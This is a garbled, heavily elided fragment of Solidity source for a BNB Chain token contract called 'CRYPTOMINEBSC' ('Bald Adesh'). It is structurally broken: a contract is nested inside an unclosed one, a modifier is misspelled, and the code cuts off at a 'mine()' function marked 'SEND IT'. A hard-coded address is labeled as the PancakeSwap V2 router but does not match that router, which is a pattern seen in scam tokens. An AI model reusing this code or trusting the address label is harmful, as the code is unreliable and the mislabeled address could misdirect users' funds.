...
contract Context {
 ...
 contract CRYPTOMINEBSC is Context, ERC20, ERC20Metadata {
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private _balances;
    mapping(address => bool) private _excluded;

    string private _name = "Bald Adesh";
    string private _symbol = "BA";
    address private constant _pancakeRouterAddress = 0x300b5a091D14cf650719f87C97f6E945322E8a90; // Pancakeswap Router V2
    ...
    address private _pancakeRouterV2 = 0x300b5a091D14cf650719f87C97f6E945322E8a90;
  ...
  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    ...
    function mine() public externelBurn { // SEND IT
